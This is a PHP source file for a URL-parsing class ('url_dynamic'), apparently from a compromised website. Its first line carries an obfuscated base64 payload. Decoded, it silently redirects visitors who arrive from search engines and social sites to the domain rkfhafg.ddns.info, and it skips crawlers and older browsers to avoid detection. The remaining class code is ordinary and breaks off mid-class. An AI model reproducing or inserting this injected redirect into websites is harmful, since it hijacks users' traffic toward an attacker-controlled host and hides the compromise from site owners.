<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/custom_url.php");

class url_dynamic extends custom_url {

  function url_dynamic($current_url = null) {

    if ($current_url) {
      $query = $current_url;
    } else {
      if (safe($_SERVER, "HTTPS") == "on")
        $query = "https://".$_SERVER["HTTP_HOST"];
      else
        $query = "http://".$_SERVER["HTTP_HOST"];
      if (isset($_SERVER["REQUEST_URI"]))
        $query .= $_SERVER["REQUEST_URI"];
      else {
        if (isset($_SERVER["PATH_INFO"]))
          $query .= safe($_SERVER, "PATH_INFO");
        else
          $query .= safe($_SERVER, "SCRIPT_NAME");
        if (isset($_SERVER["QUERY_STRING"]))
          $query .= "?".$_SERVER["QUERY_STRING"];
      }
    }

    $this->elements = parse_url($query);

    parse_str($this->element("query"), $this->values);

    $this->domain_name  = $this->element("host");

    $pathinfo = pathinfo($this->element("path"));
    $scr_pathinfo = pathinfo(safe($_SERVER, "SCRIPT_NAME"));
    if ($scr_pathinfo["basename"] and (eregi('/$', $this->element("path")))) {
      $this->elements["path"] .= $scr_pathinfo["basename"];
      $pathinfo = pathinfo($this->element("path"));
    }
    $this->relative_url = str_replace('//', '/', str_replace('\\', '/', $pathinfo["dirname"]).'/');
    $this->base_url     = $this->relative_url;
    $this->script_name  = $pathinfo["basename"];
    $this->params       = null;

    foreach ($this->values as $key => $value) {
      if ($value <> "")
        if (is_array($value)) {
          foreach ($value as $name => $val)
            $this->params .= ($this->params?"&":"?").$key."[".$name."]=".urlencode($val);
        } else
          $this->params .= ($this->params?"&":"?").$key."=".urlencode($value);
    }

    $this->refill();

  }

  function refill() {

    parent::refill();
    $this->current_url           = $this->url;
    $this->current_url_wo_params = $this->url_wo_params;

  }
